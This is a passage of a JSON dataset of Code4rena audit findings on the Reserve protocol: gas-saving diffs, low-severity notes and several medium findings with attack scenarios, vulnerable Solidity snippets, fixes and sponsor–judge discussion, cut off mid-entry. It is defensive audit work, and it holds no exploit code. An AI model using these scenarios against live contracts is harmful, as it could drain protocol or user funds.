      "title": "[G-08]`BasketLib.nextBasket()` refactoring",
      "impact": "GAS",
      "content": "Gas saved: a few thousand\n\nThe following refactoring saves a few thousands of gas mostly by preventing:\n1. Double call to `goodCollateral`\n2. The second iteration over the whole `backup.erc20s` array \n```diff\ndiff --git a/contracts/p1/mixins/BasketLib.sol b/contracts/p1/mixins/BasketLib.sol\nindex bc52d1c6..7ab9c48b 100644\n--- a/contracts/p1/mixins/BasketLib.sol\n+++ b/contracts/p1/mixins/BasketLib.sol\n@@ -192,10 +192,8 @@ library BasketLibP1 {\n         // For each prime collateral token:\n         for (uint256 i = 0; i < config.erc20s.length; ++i) {\n             // Find collateral's targetName index\n-            uint256 targetIndex;\n-            for (targetIndex = 0; targetIndex < targetsLength; ++targetIndex) {\n-                if (targetNames.at(targetIndex) == config.targetNames[config.erc20s[i]]) break;\n-            }\n+            uint256 targetIndex = targetNames._inner._indexes[config.targetNames[config.erc20s[i]]] -1 ;\n+ \n             assert(targetIndex < targetsLength);\n             // now, targetNames[targetIndex] == config.targetNames[erc20]\n \n@@ -244,32 +242,32 @@ library BasketLibP1 {\n             uint256 size = 0; // backup basket size\n             BackupConfig storage backup = config.backups[targetNames.at(i)];\n \n+            IERC20[] memory backupsToUse = new IERC20[](backup.erc20s.length);\n+\n             // Find the backup basket size: min(backup.max, # of good backup collateral)\n             for (uint256 j = 0; j < backup.erc20s.length && size < backup.max; ++j) {\n-                if (goodCollateral(targetNames.at(i), backup.erc20s[j], assetRegistry)) size++;\n+                if (goodCollateral(targetNames.at(i), backup.erc20s[j], assetRegistry)) \n+                {\n+                    backupsToUse[size] = backup.erc20s[j];\n+                    size++;\n+                }\n             }\n \n             // Now, size = len(backups(tgt)). If empty, fail.\n             if (size == 0) return false;\n \n-            // Set backup basket weights...\n-            uint256 assigned = 0;\n \n             // Loop: for erc20 in backups(tgt)...\n-            for (uint256 j = 0; j < backup.erc20s.length && assigned < size; ++j) {\n-                if (goodCollateral(targetNames.at(i), backup.erc20s[j], assetRegistry)) {\n-                    // Across this .add(), targetWeight(newBasket',erc20)\n-                    // = targetWeight(newBasket,erc20) + unsoundPrimeWt(tgt) / len(backups(tgt))\n-                    newBasket.add(\n-                        backup.erc20s[j],\n-                        totalWeights[i].minus(goodWeights[i]).div(\n-                            // this div is safe: targetPerRef > 0: goodCollateral check\n-                            assetRegistry.toColl(backup.erc20s[j]).targetPerRef().mulu(size),\n-                            CEIL\n-                        )\n-                    );\n-                    assigned++;\n-                }\n+            for (uint256 j = 0; j < size; ++j) {\n+\n+                newBasket.add(\n+                    backupsToUse[j],\n+                    totalWeights[i].minus(goodWeights[i]).div(\n+                        // this div is safe: targetPerRef > 0: goodCollateral check\n+                        assetRegistry.toColl(backupsToUse[j]).targetPerRef().mulu(size),\n+                        CEIL\n+                    )\n+                );\n             }\n             // Here, targetWeight(newBasket, e) = primeWt(e) + backupWt(e) for all e targeting tgt\n         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27360",
      "title": "[G-07] Caching storage variable and function calls",
      "impact": "GAS",
      "content": "This is one of the most common ways to save a nice amount of gas. Every additional read costs 100 gas units (when it comes to mapping or arrays there's additional cost), and each additional function call costs at least 100 gas units (usually much more).\n\nI've noticed a few instances where a storage variable read or a view-function call can be cached to memory to save gas, I'm pretty sure there are many more instances that I didn't notice.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27359",
      "title": "[G-06] Require array to be sorted and use `sortedAndAllUnique` at `BackingManager.forwardRevenue()`",
      "impact": "GAS",
      "content": "Estimated savings: `~n^2*10` where n is the length of the asset.<br>\nFor example for 20 assets that would save ~4K.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27358",
      "title": "[G-05] Update `lastWithdrawRefresh` only if it has changed",
      "impact": "GAS",
      "content": "Gas saved: ~100\n\nAt [`leakyRefresh()`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/StRSR.sol#L674) `lastWithdrawRefresh` gets updated even if didn't change, that costs an additional 100 gas units.\n\nProposed change:\n```diff\n-        leaked = lastWithdrawRefresh != lastRefresh ? withdrawal : leaked + withdrawal;\n-        lastWithdrawRefresh = lastRefresh;\n+        if(lastWithdrawRefresh != lastRefresh){\n+                leaked =  withdrawal;\n+                lastWithdrawRefresh = lastRefresh;\n+        } else{\n+                leaked = leaked + withdrawal;\n+        }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27357",
      "title": "[G-04] Deployer.implementations can be immutable",
      "impact": "GAS",
      "content": "Gas saved: ~28K per RToken deployment\n\nThe struct itself can’t be immutable, but you can save the values of the fields (and fields of the `components`) as immutable variables, and use an internal function to build the struct out of those immutable variables.\n\nThis would save ~2.1K per field, with 13 fields that brings us to ~28K of units saved.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27356",
      "title": "[G-03] Use `furnace` instead of `main.furnace()`",
      "impact": "GAS",
      "content": "Gas savings: ~2.6K\n\nCode: https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RToken.sol#L184<br>\nhttps://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RToken.sol#L257\n\nAt `RToken.redeemTo()` and `redeemCustom()` furnace is being called using `main.furnace()` instead of using the `furnace` variable.\n\nThe call to `main.furnace()` costs both the cold storage variable read at `main.furnace()` and an external call to a cold address while using the `furnace` variable of the current contract costs only the cold storage read.\n\nThe additional cold call would cost ~2.6K.\n\nTo my understanding both of the values should be equal at all times so there shouldn't be an issue with the replacement.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27355",
      "title": "[G-02] Get `targetIndex` from mapping instead of iterating",
      "impact": "GAS",
      "content": "Gas savings: a few thousands (see below)\n\nThe following code is used at the [BasketLib](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/mixins/BasketLib.sol#L196-L198) to find the index of a value inside an `EnumerableSet`\n```solidity\n            for (targetIndex = 0; targetIndex < targetsLength; ++targetIndex) {\n                if (targetNames.at(targetIndex) == config.targetNames[config.erc20s[i]]) break;\n            }\n```\n\nHowever the index can be fetched directly from the `_indexed` mapping:\n\n\n```diff\ndiff --git a/contracts/p1/mixins/BasketLib.sol b/contracts/p1/mixins/BasketLib.sol\nindex bc52d1c6..ce56c715 100644\n--- a/contracts/p1/mixins/BasketLib.sol\n+++ b/contracts/p1/mixins/BasketLib.sol\n@@ -192,10 +192,8 @@ library BasketLibP1 {\n         // For each prime collateral token:\n         for (uint256 i = 0; i < config.erc20s.length; ++i) {\n             // Find collateral's targetName index\n-            uint256 targetIndex;\n-            for (targetIndex = 0; targetIndex < targetsLength; ++targetIndex) {\n-                if (targetNames.at(targetIndex) == config.targetNames[config.erc20s[i]]) break;\n-            }\n+            uint256 targetIndex = targetNames._inner._indexes[config.targetNames[config.erc20s[i]]] -1 ;\n+ \n             assert(targetIndex < targetsLength);\n             // now, targetNames[targetIndex] == config.targetNames[erc20]\n ```\n\nGas savings:\n* The `_indexes` keys are considered warm since all values were inserted in the current tx\n* Total saving is the sum of the index of the target names per each erc20 minus 1\n* on average (depends on the location of the target in the set for each erc20): `(config.erc20s.length)*(targetsLength-1)/2*100`\n    * E.g. for target length of 5 and 10 ERC20 that would save on average `10*4/2*100=2K`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27354",
      "title": "[G-01] At `toColl()` and `toAsset()` use the mapping to check if asset exists",
      "impact": "GAS",
      "content": "Savings: ~2.1K per call\n\nNotice this is a function that's being called frequently, and many times per tx.\n\n**Overall this can save a few thousands of gas units per tx for the most common txs (e.g. issuance, redemption)**\n\nhttps://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/AssetRegistry.sol#L120-L132\n\nAt `toColl()` and `toAsset()` instead of using the EnumberableSet to check that the erc20 is registered just check that the value returned from the mapping isn't zero (this is supposed to be equivalent as long as the governance doesn't register the zero address as an asset contract - maybe add a check for that at `register()`).\n\nProposed changes:\n```solidity\n\n    /// Return the Asset registered for erc20; revert if erc20 is not registered.\n    // checks: erc20 in assets\n    // returns: assets[erc20]\n    function toAsset(IERC20 erc20) external view returns (IAsset) {\n        IAsset asset = assets[erc20];\n        require(asset != IAsset(address(0)), \"erc20 unregistered\");\n        return asset;\n    }\n\n    /// Return the Collateral registered for erc20; revert if erc20 is not registered as Collateral\n    // checks: erc20 in assets, assets[erc20].isCollateral()\n    // returns: assets[erc20]\n    function toColl(IERC20 erc20) external view returns (ICollateral) {\n        IAsset coll = assets[erc20];\n        require(coll != IAsset(address(0)), \"erc20 unregistered\");\n        require(coll.isCollateral(), \"erc20 is not collateral\");\n        return ICollateral(address(coll));\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27353",
      "title": "[09] Protocol might not be able to compromise basket when needed",
      "impact": "LOW",
      "content": "Consider the following scenario:\n* Protocol suffers from some loss and compromises the basket to a 1.1e9 ratio\n* Months pass by and users mint new tokens and increase the TVL\n* A small compromise is required (12%), this brings the ratio to below 1e9 and reverts the compromise\n* Protocol is now disabled despite holding a significant amount of value, and users can only redeem for their prorata share of the assets,\n\nThis might be intended design, but worth taking this scenario into account.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27352",
      "title": "[08] If a token that yields RSR would be used as collateral then 100% of the yield would go to StRSR",
      "impact": "LOW",
      "content": "This isn’t very likely to happen (currently the only token that yields RSR is StRSR of another RToken) but it’s worth keeping an eye on it.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27351",
      "title": "[07] `MIN_AUCTION_LENGTH` seems too low",
      "impact": "LOW",
      "content": "The current `MIN_AUCTION_LENGTH` is set to 2 blocks.\nThis seems a bit too low since the price is time-dependant that means there would be only 3 price options for the auctions, and the final price wouldn't necessarily be the optimal price for the protocol.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27350",
      "title": "[06] `refreshBasket` can be called before the first prime basket was set",
      "impact": "LOW",
      "content": "This will result in an event being emitted but will not impact the contract's state.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27349",
      "title": "[05] `redeemCustom` allows the use of the zero basket",
      "impact": "LOW",
      "content": "The basket with nonce `#0` is an empty basket, `redeemCustom` allows to specify that basket for redemption, which will result in a loss for the redeemer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27348",
      "title": "[04] `distributeTokenToBuy()` can be called while paused/frozen",
      "impact": "LOW",
      "content": "Due to the removal of `notPausedOrFrozen` from `Distributor.distribute()` it's now possible to execute `RevenueTrader.distributeTokenToBuy()` while paused or frozen.\n\nThis is relevant when `tokensToBuy` is sent directly to the revenue trader: RSR sent to RSRTrader or RToken sent directly to RTokenTrader\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27347",
      "title": "[03] Reorg attack",
      "impact": "LOW",
      "content": "Reorg attacks aren't very common on mainnet (but more common on L2s if the protocol intends to ever launch on them), but they can still happen (there was [a 7 blocks reorg](https://decrypt.co/101390/ethereum-beacon-chain-blockchain-reorg) on the Beacon chain before the merge).\nIt can be relevant in the following cases (I've reported a med separately, the followings are the ones I consider low):\n* RToken deployment - a user might mint right after the RToken was deployed, a reorg might be used to deploy a different RToken and trap the users' funds in it (since the deployer becomes the owner).\n* Dutch Auction - a reorg might switch the addresses of 2 auctions, causing the user to bid on the wrong auction \n* Gnosis auctions - this can also cause the user to bid on the wrong auction (it's more relevant for the `EasyAuction` contract which is OOS)\n\nAs a mitigation - make sure to deploy all contracts with `create2` using a salt that's unique to the features of the contract, that will ensure that even in the case of a reorg it wouldn't be deployed to the same address as before.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27346",
      "title": "[02] Leaky refresh math is incorrect",
      "impact": "LOW",
      "content": "`leakyRefresh()` keeps track of the percentage that was withdrawn since last refresh by adding up the current percentage that's being withdrawn each time.\nHowever, the current percentage is being calculated as part of the current `totalRSR`, which doesn't account for the already withdrawn drafts.\n\nThis will trigger the `withdrawalLeak` threshold earlier than expected.\nE.g. if the threshold is set to `25%` and 26 users try to withdraw `1%` each - the leaky refresh would be triggered by the 23rd person rather than by the 26th.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27345",
      "title": "[01] A redeemer might get 'front-run' by a freezer",
      "impact": "LOW",
      "content": "Before redemption `furnace.melt()` is called, which increases a bit the amount of assets the redeemer gets in return.\nWhile frozen the `melt()` call will revert, but since the call is surrounded by a try-catch block the redemption will continue.\n\nThis can lead to a case where a user sends out a redeem tx, expecting melt to be called by the redeem function,  but before the tx is executed the protocol gets frozen. This means the user wouldn't get the additional value they expected to get from melting (and that they can get if they choose to wait till after the freeze is over).\n\nIf the last time `melt()` was called wasn't long enough then the additional value from melting wouldn't be that significant. But there can be cases where it can be longer - e.g. low activity or after a freeze (meaning there are 2 freezes one after the other and a user is attempting to redeem between them).\n\nAs a mitigation allow the user to specify if they're ok with skipping the call to `melt()`, if they didn't specifically allow it then revert.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27344",
      "title": "[M-12] Custom redemption can be used to get more than RToken value, when an upwards depeg occurs",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RToken.sol#L245-L338> <br><https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BasketHandler.sol#L437-L440>\n\nCustom redemption allows to redeem RToken in exchange of a mix of previous baskets (as long as it's not more than the prorata share of the redeemer).\nThe assumption is that previous baskets aren't worth more than the target value of the basket.\nHowever, a previous basket can contain a collateral that depegged upwards and is now actually worth more than its target.\n\n### Impact\n\nFunds that are supposed to go revenue traders would be taken by an attacker redeeming RToken.\n\n### Proof of Concept\n\nThe [following code](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/plugins/assets/FiatCollateral.sol#L142-L148) shows that when a depeg occurs the collateral becomes IFFY (which means it'll be disabled after a certain delay):\n\n```solidity\n            // If the price is below the default-threshold price, default eventually\n            // uint192(+/-) is the same as Fix.plus/minus\n            if (pegPrice < pegBottom || pegPrice > pegTop || low == 0) {\n                markStatus(CollateralStatus.IFFY);\n            } else {\n                markStatus(CollateralStatus.SOUND);\n            }\n```\n\nConsider the following scenario:\n\n*   Basket contains token X which is supposed to be pegged to c\n*   Token X depegs upwards and is now worth 2c\n*   After `delayUntilDefault` passes the basket gets disabled\n*   A basket refresh is executed (can be done by anybody) and token Y kicks in as the backup token\n*   Half of token X is now traded for the required Y tokens\n*   The other half should go to revenue traders (rsr trader and Furnace), but before anyone calls ‘forewardRevenue’ the attacker calls custom redemption with half from the current basket and half of the previous one\n*   The user would get 0.5X+0.5Y per each RToken which is worth 1.5c\n\n### Recommended Mitigation Steps\n\nWhen doing custom redemption check that the collateral used is sound or at least check that the price isn't higher then the peg price.\n\n**[tbrent (Reserve) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/6#issuecomment-1620823067):**\n > This is also true of normal redemption via `redeem()` until `refreshBasket()` is called after the collateral has cycled from IFFY to DISABLED. \n> \n> It only checks `basketHandler.fullyCollateralized()`, not `basketHandler.isReady()`. This is intended. It is important to not disallow redemption, and using USD prices to determine redemption quantities is opposite to the fundamental design of the protocol. \n> \n > Agree that the behavior is as the warden indicates. All alternatives seem worse, however. I think this is probably not HIGH. We do not expect to make any change to the behavior. \n\n**[0xean (judge) reduced severity to Medium and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/6#issuecomment-1632945825):**\n > I think Medium seems like the correct severity here.  There are pre-conditions for this to occur and in addition the likelihood doesn't seem very high.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential vulnerability in the Reserve Protocol's RToken Contract. Custom redemption allows users to redeem RToken in exchange for a mix of previous baskets, as long as it's not more than the prorata share of the redeemer. There is an assumption that previous baskets are not worth more than the target value of the basket. However, a previous basket can contain a collateral that depegged upwards and is now actually worth more than its target. This means that an attacker could redeem RToken for more than the target value of the basket, taking funds that are supposed to go to revenue traders.\n\nThe bug report includes a proof of concept code snippet, which shows that when a depeg occurs the collateral becomes IFFY (which means it'll be disabled after a certain delay). It also includes an example scenario to demonstrate how the vulnerability could be exploited.\n\nThe recommended mitigation steps suggest that when doing custom redemption it should be checked that the collateral used is sound, or at least that the price isn't higher than the peg price. After discussion, the severity of the bug was reduced from High to Medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/6",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "27343",
      "title": "[M-11] Attacker can disable basket during un-registration, which can cause an unnecessary trade in some cases",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/AssetRegistry.sol#L89-L93> <br><https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/AssetRegistry.sol#L106-L110>\n\nAt the mitigation audit there was an issue regarding the `basketHandler.quantity()` call at the unregistration process taking up all gas.\nAs a mitigation to that issue the devs set aside some gas and use the remaining to do that call.\nThis opens up to a new kind of attack, where a attacker can cause the call to revert by not supplying enough gas to it.\n\n### Impact\n\nThis can cause the basket to get disabled, which would require a basket refresh.\n\nAfter a basket refresh is done, an additional warmup period has to pass for some functionality to be available again (issuance, rebalancing and forwarding revenue).\n\nIn some cases this might trigger a basket switch that would require the protocol to rebalance via trading, trading can have some slippage which can cause a loss for the protocol.\n\n### Proof of Concept\n\nThe `quantity()` function is being called with the amount of gas that `_reserveGas()` returns\n\nIf an attacker causes the gas to be just right above `GAS_TO_RESERVE` the function would be called with 1 unit of gas, causing it to revert:\n\n```solidity\n    function _reserveGas() private view returns (uint256) {\n        uint256 gas = gasleft();\n        require(gas > GAS_TO_RESERVE, \"not enough gas to unregister safely\");\n        return gas - GAS_TO_RESERVE;\n    }\n```\n\nRegarding the unnecessary trade, consider the following scenario:\n\n*   The basket has USDC as the main asset and DAI as a backup token\n*   A proposal to replace the backup token with USDT was raised\n*   A proposal to unregister BUSD (which isn't part of the basket) was raised too\n*   USDC defaults and DAI kicks in as the backup token\n*   Both proposals are now ready to execute and the attacker executes the backup proposal first, then the unregister while disabling the basket using the bug in question\n*   Now, when the basket is refreshed DAI will be replaced with USDT, making the protocol to trade DAI for USDT\n\nThe refresh was unnecessary and therefore the trade too.\n\n### Recommended Mitigation Steps\n\nReserve gas for the call as well:\n\n```diff\n    function _reserveGas() private view returns (uint256) {\n        uint256 gas = gasleft();\n-        require(gas > GAS_TO_RESERVE, \"not enough gas to unregister safely\");\n+        require(gas >= GAS_TO_RESERVE + MIN_GAS_FOR_EXECUTION, \"not enough gas to unregister safely\");\n        return gas - GAS_TO_RESERVE;\n    }\n```\n\nDisclosure: this issue was [mentioned in the comments](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1435483929) to the issue in the mitigation audit; however, since this wasn't noticed by the devs and isn't part of the submission, I don't think this should be considered a known issue.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/7#issuecomment-1586332703):**\n > Applaud @0xA5DF for highlighting this on their own issue.\n> \n> > *Disclosure: this issue was [mentioned in the comments](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1435483929) to the issue in the mitigation audit, however since this wasn't noticed by the devs and isn't part of the submission I don't think this should be considered a known issue*\n> \n> Look forward to discussion with sponsor. \n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/7#issuecomment-1589904155):**\n > We've discussed and agree with with the warden that this should not be considered a known issue. \n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Change gas reservation policy in `AssetRegistry`.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/857\n\n**Status:** Mitigation confirmed. Full details in reports from [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/27), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/39), and [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/18) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Reserve Protocol's AssetRegistry contract that could allow an attacker to cause the unregistration process to fail by not supplying enough gas. This could cause the basket to be disabled, which would require a basket refresh and a warmup period to be passed before some functionality is available again. In some cases, this could trigger a basket switch that would require the protocol to rebalance via trading, which could cause a loss for the protocol. \n\nThe bug is caused by the `quantity()` function being called with the amount of gas that `_reserveGas()` returns. If an attacker causes the gas to be just right above `GAS_TO_RESERVE` the function would be called with 1 unit of gas, causing it to revert.\n\nThe recommended mitigation steps are to reserve gas for the call as well: \n\n```diff\n    function _reserveGas() private view returns (uint256) {\n        uint256 gas = gasleft();\n-        require(gas > GAS_TO_RESERVE, \"not enough gas to unregister safely\");\n+        require(gas >= GAS_TO_RESERVE + MIN_GAS_FOR_EXECUTION, \"not enough gas to unregister safely\");\n        return gas - GAS_TO_RESERVE;\n    }\n```\n\nThe issue was mentioned in the comments to the issue in the mitigation audit, but it was not noticed by the devs and is not part of the submission. Reserve and the Warden agreed that this should not be considered a known issue. Reserve then mitigated the issue by changing the gas reservation policy in `AssetRegistry` and the mitigation was confirmed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/7",
      "tags": [],
      "finders": [
        "0xA5DF",
        "rvierdiiev"
      ]
    },
    {
      "id": "27342",
      "title": "[M-10] An oracle deprecation might lead the protocol to sell assets for a low price",
      "impact": "MEDIUM",
      "content": "\nDuring a Dutch Auction, if a user places a bid, the trade is settled in the same transaction. As part of this process, the backing manager tries to call the `rebalance()` function again.\nThe call to `rebalance()` is wrapped in a try-catch block, if an error occurs and the error data is empty, the function will revert.\n\nThe assumption is that if the error data is empty that means it was due to an out-of-gas error, this assumption isn't always true as mentioned in a [previous issue](https://github.com/code-423n4/2023-01-reserve-findings/issues/234) (that wasn't mitigated).\nIn the case of this issue, this can result in a case where users can't bid on an auction for some time, ending up selling an asset for a price lower than the market price.\n\n### Impact\n\nProtocol's assets will be auctioned for a price lower than the market price.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n*   Chainlink announces that an oracle will get deprecated\n*   Governance passes a proposal to update the asset registry with a new oracle\n*   A re-balancing is required and executed with a Dutch Auction\n*   The oracle deprecation happens before the auction price reaches a reasonable value\n*   Any bid while the oracle is deprecated will revert\n*   Right before the auction ends the proposal to update the asset becomes available for execution (after the timelock delay has passed). Somebody executes it, bids, and enjoys the low price of the auction.\n\n### Recommended Mitigation Steps\n\nOn top of checking that the error data is empty, compare the gas before and after to ensure this is an out-of-gas error.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1586331887):**\n > On the fence on this one, it is based off a known issue from a previous Audit but does show a new problem stemming from the same problem of oracle deprecation. \n> \n> Look forward to sponsor comment. \n\n**[tbrent (Reserve) disputed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1589910605):**\n > The PoC does not function as specified. Specifically, [bidding on an auction](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/plugins/trading/DutchTrade.sol#L146) does not involve the price at the time of the tx. The price is set at the beginning of the dutch auction in the `init()` function. Therefore, it is the starting of new auctions that will revert while the oracle is deprecated, while bids will succeed and simply fail to start the next auction. \n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1633780455):**\n > > Therefore, it is the starting of new auctions that will revert while the oracle is deprecated, while bids will succeed and simply fail to start the next auction.\n> \n> Hey @tbrent - \n> I didn't quite understand the dispute here, if starting the next auction will fail/revert then the bid will revert too.<br>\n> `bid()` calls `origin.settleTrade()` and `settleTrade()` calls `rebalance()`.<br>\n> If `rebalance()` reverts due to a deprecated oracle then `settleTrade()` will revert too (`rebalance()` will revert with empty data, and therefore the catch block will trigger a revert [here](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BackingManager.sol#L94)).\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1636182107):**\n > @0xA5DF - Ah, understood now. Agree this is Medium and think it should be counted as a new finding since the consequence (dutch auction economics break) is novel. \n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1662674844):**\n > Hey @0xa5df -- we're having some confusion around exactly what happens when a chainlink oracle is deprecated. Do you have details to share about what this ends up looking like? \n> \n> We're having trouble finding documentation on this, and it feels like the aggregator contract should just stay there and return a stale value. Is that not right? Has this happened in the past or has Chainlink committed to a particular approach for deprecating?\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1662876091):**\n > Hey - It's a bit difficult to track deprecated Chainlink oracles since Chainlink removes the announcement once they're deprecated.<br>\n> I was able to track one Oracle that was deprecated during the first audit, from the original issue this seems to be [this one](https://polygonscan.com/address/0x2E5B04aDC0A3b7dB5Fd34AE817c7D0993315A8a6#readContract#F10).<br>\n> It seems that what happens is that Chainlink sets the aggregator address to the zero address, which makes the call to `latestRoundData()` to revert without any data (I guess this is due to the way Solidity handles calls to a non-contract address).<br>\n> See also the PoC in the [original 